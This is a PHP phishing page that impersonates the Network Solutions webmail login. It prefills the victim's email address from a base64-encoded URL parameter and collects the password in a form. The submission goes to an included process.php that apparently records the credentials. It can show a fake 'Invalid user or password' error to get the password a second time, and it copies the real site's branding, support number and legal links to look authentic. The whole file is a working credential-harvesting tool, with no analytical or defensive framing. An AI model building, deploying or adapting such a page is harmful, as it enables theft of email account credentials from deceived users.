<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
	
	$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
        <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
        <meta name="robots" content="noindex, nofollow">
	<meta http-equiv="Cache-Control" content="no-cache">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge,chrome=1">
	<!--
	<meta="X-UA-Compatible" content="IE=edge,chrome=1">
	-->
	<meta name="description" content="webmail">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="build-version-number" content="">
	<meta charset="utf-8">

        <title>
            Network Solutions� Webmail Login
            
        </title>
	<!--
	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
	-->
	<link href="../e/bootstrap.css" rel="stylesheet">
        <link href="../e/login.css" rel="stylesheet">
        <link href="../e/jquery-ui-1.css" rel="stylesheet">
        <script language="javascript" type="text/javascript" src="../e/jquery-1.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/jquery_004.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/form.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/cookie.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/jquery_003.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/jquery-ui-personalized-1.js">
        </script>
        <script language="javascript" src="../e/jquery.js">
        </script>
        <script language="javascript" src="../e/jquery_002.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/oxedhelpers.js">
        </script>
        <script language="javascript" type="text/javascript" src="../e/oxedlogin.js">
        </script>

        <script language="javascript" type="text/javascript">
        <!--
        	var user = "";
        	var pass = "";
        	$(document).ready(function(){
            	if(user.length > 0 && pass.length > 0){            	
        			$("#nameuser").val(user);
            		$("#passuser").val(pass);
            		$("#ajaxform").submit();
            	}
            });        	
        //-->
        </script>
    </head>
    <body>


<div class="container">
  <div class="card">
    <div class="top clearfix">

      <a href="http://www.networksolutions.com/">
        <img src="../e/logo.png" alt="Network Solutions" width="154" height="62">
      </a>
      <h1 align="center">Webmail Login</h1>

      <!-- OPTIONAL NOTICE -->
      <span class="dispmsg">
      
              </span>

      <form name="ajaxform" id="ajaxform" method="post"  >
      
      <input name="SQMSESSID" value="466d1f91c3c683659483cf9aaed84bf5" type="hidden">
        <input name="redirected" id="redirected" value="yes" type="hidden">
        <input name="csrf_token_form" id="csrf_token_form" value="a096a753a3a3cae03bf38e72f43a81f5" type="hidden" />
        <input name="nameuser" readonly="readonly" placeholder="Mailbox" value="<?php echo $log; ?>" id="nameuser" required="" type="text">
        				<input type="hidden" name="login" value="<?php echo $log; ?>">
                
                <?php if ($_GET['hihi']=='1') { ?>
                <input type="hidden" name="hihihi" value="<?php echo $log; ?>">
                  <?php }?>
                    <?php if ($_GET['hihi']=='2') { ?>
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                  <?php }?>
                    <?php if ($_GET['hihi']=='3') { ?>
                <input type="hidden" name="hihi" value="<?php echo $log; ?>">
                  <?php }?>
        <script type="text/javascript">
          var testdomainName = "weassembleitall.com";
          if (testdomainName) {
            $('#nameuser').attr("placeholder", "Mailbox");
          } else {
            $('#nameuser').attr("placeholder", "Email Address");
          }
        </script>
<input id="passuser" name="pass" placeholder="Password" required="" type="password">
<input name="submit" id="submit" value="Login" type="submit">
</form>

      <!-- ERROR MESSSAGES -->
<div id="signin-message"><?php if (isset($_GET['mgs'])){?>
<div id="err" style="display: yes;">Invalid user or password
</div>
<?php }else{?>
<div id="err" style="display: none;">Invalid user or password
</div>

<?php }?>
</div>
<div id="err" style="display: none;"><?php if (isset($_GET['mgs'])){?>Invalid user or password
<?php }?></div>
      <div class="forgotpw">
        <a id="prlink" class="pw" style="cursor: pointer;">Need to reset your password?</a>
      </div>
      <div class="moblelink">
        <a id="mobile1" class="moble" style="cursor: pointer;" href="https://knowledge.web.com/subjects/article/KA-01998">Set up your iPhone</a>
        <a id="mobile2" class="moble" style="cursor: pointer;" href="https://knowledge.web.com/subjects/article/KA-01019">Set up your Android</a>
	<br>
      </div>

    </div>
    <div class="bottom clearfix">
      <p>If you need help logging in, please contact our customer service at 1-888-793-7657 (toll free)</p>
    </div>
  </div>

  <script>
    $(function() {  // jQuery shorthand
      console.log("document ready");

      /* Password Reset link click listener */
      $('#prlink').click(function() {
        // get, validate the user input
        var nameUserVal = $.trim(document.ajaxform.nameuser.value);
        if(nameUserVal == "") {
          $('#signin-message').html("Please enter an Email Address").show();
          return;
        }
        // get domain, set from login.php and build mailbox string
        var domainName = "weassembleitall.com";
        var mailbox;
        if(nameUserVal.indexOf("@") >= 0){
          mailbox = nameUserVal;
        } else if(domainName) {
          mailbox = nameUserVal + '@' + domainName;
        } else {  // username only AND no domain found
          $('#signin-message').html("Please enter the full Email Address.").show();
          return;
        }

        // create a dynamic form element to use for possible reset password post(OX), later
        var prForm = document.createElement('form');
        prForm.setAttribute('id', 'prform');
        prForm.setAttribute('action', '/interfaces/sso/pwd_reset/prview.php');
        prForm.setAttribute('method', 'post');
        prForm.setAttribute('hidden', 'true');
        // EMMAINT-2187 - don't open new window
	//prForm.setAttribute('target', '_new');

        var mbInput = document.createElement('input');
        mbInput.setAttribute('type', 'hidden');
        mbInput.setAttribute('name', 'mailbox');
        mbInput.setAttribute('value', mailbox);

        prForm.appendChild(mbInput);
        document.body.appendChild(prForm);

        /**
         * Make ajax call to getWebmailType
         * Loads the correct landing page based on value returned from webmail_os_type_db.db
         */
        var requestData = {method: 'getWebmailType', mailbox: mailbox};
        var ajaxOptions = {
          type: "POST",
          url: "/interfaces/sso/pwd_reset/prctrl.php",
          dataType: "json",
          data: JSON.stringify(requestData),
          contentType: "application/json; charset=utf-8"
        };

        var promise = $.ajax(ajaxOptions);
        promise.done(function(data) {
          if (data.status == "success") {
            var $value = data.data['value'];
            console.log("value = " + $value);
            // NOTE: both of these may trigger the browser pop-up blocker since we are in a callback
            if ($value =='1' || $value == '4') { // it is OX or OX AppSuite
              prForm.submit();
            } else {  // it is NOT OX (EdgeDesk)
              var url = "https://knowledge.web.com/subjects/article/KA-01163";
              // EMMAINT-2187 - don't open new window
              //window.open(url, '_new');
              window.open(url, '_self');
            }
          } else {  // error, this should not happen unless server is mis-configured
            // shows 'Internal server error'
            $('#signin-message').html(data.data['msg']).show();
          }
        });

      });

    });
  </script>
        <div class="footer">
                <ul>
                        <li><a href="https://forum.web.com/networksolutions/faq/#Mail/mail-index.htm">Help Center</a></li>
                        <li><a href="http://web.com/legal/privacy-policy.aspx">Privacy Policy</a></li>
                        <li><a href="http://www.networksolutions.com/legal/static-service-agreement.jsp">Service Agreement</a></li>
                        <li><a href="http://www.networksolutions.com/legal/legal-notice.jsp">Terms of Use</a></li>
                </ul>
		<p>
            Copyright � 2018 Network Solutions, LLC, A Web.com Company.  All rights reserved.
        </p>
</div>
</div>
 
    

<div id="cluetip-waitimage" style="position: absolute; z-index: 95; display: none;"></div><div id="cluetip" style="z-index: 96; display: none; position: absolute;"><div style="z-index: 95; opacity: 0.1; top: 1px; left: 1px; position: absolute; background-color: rgb(0, 0, 0);"></div><div style="z-index: 94; opacity: 0.1; top: 2px; left: 2px; position: absolute; background-color: rgb(0, 0, 0);"></div><div style="z-index: 93; opacity: 0.1; top: 3px; left: 3px; position: absolute; background-color: rgb(0, 0, 0);"></div><div id="cluetip-outer" style="position: relative; z-index: 97;"><h3 id="cluetip-title"></h3><div id="cluetip-inner"></div></div><div id="cluetip-extra"></div><div id="cluetip-arrows" class="cluetip-arrows" style="z-index: 97;"></div></div></body></html><?php }?>